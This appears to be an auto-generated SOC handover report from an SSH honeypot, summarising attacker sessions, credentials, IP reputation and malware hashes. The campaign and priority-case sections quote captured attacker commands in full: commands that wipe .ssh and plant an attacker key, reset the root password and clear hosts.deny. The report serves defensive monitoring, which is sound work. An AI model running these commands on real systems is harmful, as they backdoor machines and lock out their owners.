# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-01 |
| **Generated At** | 2026-04-01T03:39:24Z |
| **Shift Time** | 03:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **24** |
| Confirmed Threats | **21** |
| False Positives Filtered | **3** (12.5%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **15** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **21** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **17** |
| Unique Credential Pairs | **17** |
| Unique Usernames | **14** |
| Unique Passwords | **16** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `Supervisor` | 2 |
| `Operator` | 1 |
| `config` | 1 |
| `Test` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 2 |
| `12345h` | 1 |
| `1q2w3e4r` | 1 |
| `Passw@rd` | 1 |
| `config111` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `12345h` | 1 |
| `Operator` | `1q2w3e4r` | 1 |
| `Supervisor` | `Passw@rd` | 1 |
| `config` | `config111` | 1 |
| `Test` | `qwerty12` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12345h` | `196.92.7.246` | 2026-04-01T02:27:39 |
| `root` | `Qwerty123` | `185.193.240.246` | 2026-04-01T02:53:12 |
| `root` | `ipc71a` | `119.94.7.37` | 2026-04-01T03:18:22 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:9KiAQZ6AYr8K"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `196.92.7.246`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
linuxshell
```
Source IPs: `119.94.7.37`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.193.240.246`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **21** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 2 | HIGH |
| `AS12479` | Orange Espagne SA | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 1 | HIGH |
| `AS267738` | Global Net S.R.L | 1 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | MEDIUM |
| `AS9299` | Philippine Long Distance Telephone Company | 1 | LOW |
| `AS39442` | JSC RDE "Unico" | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6e14aacd7c1b

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-04-01 02:27 |
| **Last Seen** | 2026-04-01 02:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:9KiAQZ6AYr8K"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 02:27:38` | `cowrie.session.connect` |
| `2026-04-01 02:27:38` | `cowrie.client.version` |
| `2026-04-01 02:27:38` | `cowrie.client.kex` |
| `2026-04-01 02:27:39` | `cowrie.login.success` |
| `2026-04-01 02:27:39` | `cowrie.session.params` |
| `2026-04-01 02:27:39` | `cowrie.command.input` |
| `2026-04-01 02:27:39` | `cowrie.command.failed` |
| `2026-04-01 02:27:39` | `cowrie.log.closed` |
| `2026-04-01 02:27:39` | `cowrie.session.params` |
| `2026-04-01 02:27:39` | `cowrie.command.input` |
| `2026-04-01 02:27:40` | `cowrie.session.file_download` |
| `2026-04-01 02:27:40` | `cowrie.log.closed` |
| `2026-04-01 02:27:56` | `cowrie.session.params` |
| `2026-04-01 02:27:56` | `cowrie.command.input` |
| `2026-04-01 02:27:56` | `cowrie.log.closed` |
| `2026-04-01 02:27:56` | `cowrie.session.params` |
| `2026-04-01 02:27:56` | `cowrie.command.input` |
| `2026-04-01 02:27:56` | `cowrie.log.closed` |
| `2026-04-01 02:27:57` | `cowrie.session.params` |
| `2026-04-01 02:27:57` | `cowrie.command.input` |
| `2026-04-01 02:27:57` | `cowrie.session.file_download` |
| `2026-04-01 02:27:57` | `cowrie.log.closed` |
| `2026-04-01 02:27:57` | `cowrie.session.params` |
| `2026-04-01 02:27:57` | `cowrie.command.input` |
| `2026-04-01 02:27:57` | `cowrie.log.closed` |
| `2026-04-01 02:27:58` | `cowrie.session.params` |
| `2026-04-01 02:27:58` | `cowrie.command.input` |
| `2026-04-01 02:27:58` | `cowrie.log.closed` |
| `2026-04-01 02:27:58` | `cowrie.session.params` |
| `2026-04-01 02:27:58` | `cowrie.command.input` |
| `2026-04-01 02:27:58` | `cowrie.command.input` |
| `2026-04-01 02:27:58` | `cowrie.log.closed` |
| `2026-04-01 02:27:59` | `cowrie.session.params` |
| `2026-04-01 02:27:59` | `cowrie.command.input` |
| `2026-04-01 02:27:59` | `cowrie.log.closed` |
| `2026-04-01 02:27:59` | `cowrie.session.params` |
| `2026-04-01 02:27:59` | `cowrie.command.input` |
| `2026-04-01 02:27:59` | `cowrie.log.closed` |
| `2026-04-01 02:28:00` | `cowrie.session.params` |
| `2026-04-01 02:28:00` | `cowrie.command.input` |
| `2026-04-01 02:28:00` | `cowrie.log.closed` |
| `2026-04-01 02:28:00` | `cowrie.session.params` |
| `2026-04-01 02:28:00` | `cowrie.command.input` |
| `2026-04-01 02:28:00` | `cowrie.log.closed` |
| `2026-04-01 02:28:01` | `cowrie.session.params` |
| `2026-04-01 02:28:01` | `cowrie.command.input` |
| `2026-04-01 02:28:01` | `cowrie.log.closed` |
| `2026-04-01 02:28:01` | `cowrie.session.params` |
| `2026-04-01 02:28:01` | `cowrie.command.input` |
| `2026-04-01 02:28:01` | `cowrie.log.closed` |
| `2026-04-01 02:28:02` | `cowrie.session.params` |
| `2026-04-01 02:28:02` | `cowrie.command.input` |
| `2026-04-01 02:28:02` | `cowrie.log.closed` |
| `2026-04-01 02:28:02` | `cowrie.session.params` |
| `2026-04-01 02:28:02` | `cowrie.command.input` |
| `2026-04-01 02:28:02` | `cowrie.log.closed` |
| `2026-04-01 02:28:03` | `cowrie.session.params` |
| `2026-04-01 02:28:03` | `cowrie.command.input` |
| `2026-04-01 02:28:03` | `cowrie.log.closed` |
| `2026-04-01 02:28:03` | `cowrie.session.params` |
| `2026-04-01 02:28:03` | `cowrie.command.input` |
| `2026-04-01 02:28:03` | `cowrie.log.closed` |
| `2026-04-01 02:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7619a17f9db

| Field | Detail |
|---|---|
| **Source IP** | `185.193.240[.]246` |
| **First Seen** | 2026-04-01 02:53 |
| **Last Seen** | 2026-04-01 02:53 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 02:53:11` | `cowrie.session.connect` |
| `2026-04-01 02:53:11` | `cowrie.client.version` |
| `2026-04-01 02:53:12` | `cowrie.client.kex` |
| `2026-04-01 02:53:12` | `cowrie.login.success` |
| `2026-04-01 02:53:13` | `cowrie.session.params` |
| `2026-04-01 02:53:13` | `cowrie.command.input` |
| `2026-04-01 02:53:13` | `cowrie.command.failed` |
| `2026-04-01 02:53:13` | `cowrie.log.closed` |
| `2026-04-01 02:53:13` | `cowrie.session.params` |
| `2026-04-01 02:53:13` | `cowrie.command.input` |
| `2026-04-01 02:53:45` | `cowrie.session.file_download` |
| `2026-04-01 02:53:45` | `cowrie.log.closed` |
| `2026-04-01 02:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.193.240[.]246` to AbuseIPDB if not already reported
- [ ] Block `185.193.240[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `150.246.249[.]149` | 1 | 2026-04-01 03:31 | 2026-04-01 03:32 | 30s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]50` | 1 | 2026-04-01 03:32 | 2026-04-01 03:32 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.167.96[.]50` | 1 | 2026-04-01 02:50 | 2026-04-01 02:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.245[.]60` | 1 | 2026-04-01 02:46 | 2026-04-01 02:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.76.36[.]62` | 1 | 2026-04-01 03:12 | 2026-04-01 03:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.109.195[.]179` | 1 | 2026-04-01 02:41 | 2026-04-01 02:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.236[.]113` | 1 | 2026-04-01 02:52 | 2026-04-01 02:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `213.234.9[.]218` | 1 | 2026-04-01 02:34 | 2026-04-01 02:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.25.108[.]2` | 1 | 2026-04-01 02:54 | 2026-04-01 02:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.167.168[.]210` | 1 | 2026-04-01 02:36 | 2026-04-01 02:36 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.245.210[.]70` | 1 | 2026-04-01 03:33 | 2026-04-01 03:33 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.161[.]126` | 1 | 2026-04-01 02:53 | 2026-04-01 02:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.251[.]41` | 1 | 2026-04-01 02:34 | 2026-04-01 02:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `67.78.42[.]6` | 1 | 2026-04-01 03:20 | 2026-04-01 03:20 | 13s | 0 | `T1592` | 🟢 LOW |
| `78.184.2[.]42` | 1 | 2026-04-01 03:21 | 2026-04-01 03:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.100.126[.]84` | 1 | 2026-04-01 02:52 | 2026-04-01 02:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.160.135[.]217` | 1 | 2026-04-01 03:10 | 2026-04-01 03:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.161.217[.]228` | 1 | 2026-04-01 02:33 | 2026-04-01 02:35 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `97.113.167[.]222` | 1 | 2026-04-01 03:29 | 2026-04-01 03:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.171.236[.]113` | MY | Celcom Axiata Berhad | **100** ⚠️ | 13 |
| `45.167.168[.]210` | AR | Global Net S.R.L | **100** ⚠️ | 0 |
| `97.113.167[.]222` | US | CenturyLink Communications, LLC | **100** ⚠️ | 4 |
| `78.184.2[.]42` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 8 |
| `85.100.126[.]84` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 8 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `58.245.210[.]70` | CN | China Unicom Jilin province network | **100** ⚠️ | 45 |
| `196.92.7[.]246` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `213.234.9[.]218` | RU | OAO Bank Petrokommerc | **100** ⚠️ | 19 |
| `90.160.135[.]217` | ES | Orange Espagne SA | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 18 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 24 cases |
| Tool 34  | Credential Extractor        | ✅ 17 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (12.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 19 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-01T03:39:24Z_
